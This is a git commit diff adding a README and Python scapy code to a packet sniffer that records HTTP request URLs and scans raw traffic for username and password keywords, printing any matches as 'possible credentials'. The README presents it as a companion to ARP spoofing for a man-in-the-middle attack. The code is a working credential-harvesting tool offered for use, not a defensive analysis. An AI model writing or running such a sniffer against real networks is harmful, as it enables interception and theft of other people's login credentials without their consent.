9b4b1703f004d1e4b4dc8d2660117f32685812ac
Tut-k0 <Tut_k0@protonmail.com>
2021-09-19 05:55:49 -0500

    Finishing sniffer.py and readme

---
+++ Packet_Sniffer/README.md
@@ -0,0 +1,3 @@
+# Packet Sniffer
+
+Packet sniffer that needs an interface to sniff on specified. Good when used in conjunction with ARP spoofing to create a MITM (Man in The Middle) attack.
--- Packet_Sniffer/sniffer.py
+++ Packet_Sniffer/sniffer.py
@@ -9,10 +9,27 @@ def sniff(interface):
     scapy.all.sniff(iface=interface, store=False, prn=sniffed_packet)
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def login_info(packet):
+    if packet.haslayer(scapy.all.Raw):
+        load = packet[scapy.all.Raw].load
+        keywords = [b"uname", b"username", b"login", b"login_user", b"user", b"password", b"pass", b"login_pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
 def sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.all.Raw):
-            print(packet[scapy.all.Raw].load)
+        url = get_url(packet)
+        print("- HTTP Request >> " + url.decode())
+
+        login = login_info(packet)
+        if login:
+            print("\n- Possible credentials >> " + login.decode() + "\n")
 
 
 sniff("eth0")
